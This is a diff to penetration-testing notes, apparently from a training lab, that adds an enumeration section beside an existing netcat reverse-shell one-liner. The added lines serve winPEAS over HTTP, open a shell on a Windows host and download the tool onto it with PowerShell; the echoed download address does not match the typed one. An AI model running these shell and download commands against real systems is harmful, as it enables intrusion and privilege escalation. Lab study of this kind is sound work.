@@ -168,6 +168,30 @@ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.7 8443 >/tm
 └─$ nc -lvnp 8443
 listening on [any] 8443 ...
 ```
+### Automated Enumeration
+
+```
+kali@kali:~$ cp /usr/share/peass/winpeas/winPEASx64.exe .
+
+kali@kali:~$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+```
+
+```
+kali@kali:~$ nc 192.168.50.220 4444
+Microsoft Windows [Version 10.0.22000.318]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Users\dave> powershell
+powershell
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
+
+PS C:\Users\dave> iwr -uri http://192.168.118.2/winPEASx64.exe -Outfile winPEAS.exe
+iwr -uri http://192.168.118.3/winPEASx64.exe -Outfile winPEAS.exe
+```
 
 ## Tips
 
